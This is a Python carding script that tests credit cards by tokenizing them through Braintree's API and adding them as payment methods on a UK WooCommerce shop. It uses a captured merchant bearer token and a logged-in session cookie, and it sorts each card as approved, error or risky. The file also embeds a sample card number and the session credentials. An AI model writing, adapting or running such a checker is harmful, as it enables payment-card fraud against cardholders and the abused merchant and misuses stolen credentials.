import requests, re, base64, random, string, user_agent, time
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	

	





	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk2MDU2MjEsImp0aSI6IjliNmFmMTJmLWIxMTItNGRlYS04MzcwLTFkZWU0NmI0ZDVlMyIsInN1YiI6InRncHBoeWI1OWd3Z2NyaGYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRncHBoeWI1OWd3Z2NyaGYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.cqB81LRfQ7dvb48tdQ8dCS8ypoh9aGo2r1NDMMM5cBUMufCgDeeko6hq631sHvAG85n4VPkkGc6e32Nc_TWXiA',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'cdd28a83-eb57-4c9d-8375-3401450a4ca8',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"cdd28a83-eb57-4c9d-8375-3401450a4ca8"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)



	tok = response.json()['data']['tokenizeCreditCard']['token']










	cookies = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-27%2020%3A11%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-06-27%2020%3A11%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_gcl_au': '1.1.648225219.1719519116',
    'woocommerce_multicurrency_forced_currency': 'GBP',
    'woocommerce_multicurrency_language': 'en',
    'wordpress_logged_in_5ed5bdfb8b15aca54378ac3a16c4aae5': 'moh5527vbnm%7C1720728728%7Cp18iSHpb5DcWGB93ZjEWoxt6kZXMQNPhV2NlOAUtiqh%7C8f475c3ab21407d2fe47468571983fe4d6ea9e3510e381b51cc3e0e182e73356',
    'wp_woocommerce_session_5ed5bdfb8b15aca54378ac3a16c4aae5': '8111%7C%7C1719691916%7C%7C1719688316%7C%7C3ad8bed86f999f63a94464c37e98acf5',
    'moove_gdpr_popup': '%7B%22strict%22%3A%221%22%2C%22thirdparty%22%3A%220%22%2C%22advanced%22%3A%220%22%7D',
    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F',
}

	headers = {
    'authority': 'www.info-stor.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-27%2020%3A11%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-06-27%2020%3A11%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gcl_au=1.1.648225219.1719519116; woocommerce_multicurrency_forced_currency=GBP; woocommerce_multicurrency_language=en; wordpress_logged_in_5ed5bdfb8b15aca54378ac3a16c4aae5=moh5527vbnm%7C1720728728%7Cp18iSHpb5DcWGB93ZjEWoxt6kZXMQNPhV2NlOAUtiqh%7C8f475c3ab21407d2fe47468571983fe4d6ea9e3510e381b51cc3e0e182e73356; wp_woocommerce_session_5ed5bdfb8b15aca54378ac3a16c4aae5=8111%7C%7C1719691916%7C%7C1719688316%7C%7C3ad8bed86f999f63a94464c37e98acf5; moove_gdpr_popup=%7B%22strict%22%3A%221%22%2C%22thirdparty%22%3A%220%22%2C%22advanced%22%3A%220%22%7D; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.info-stor.co.uk%2Faccount%2Fadd-payment-method%2F',
    'origin': 'https://www.info-stor.co.uk',
    'pragma': 'no-cache',
    'referer': 'https://www.info-stor.co.uk/account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': '88f081cd23',
    '_wp_http_referer': '/account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post('https://www.info-stor.co.uk/account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	
	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	
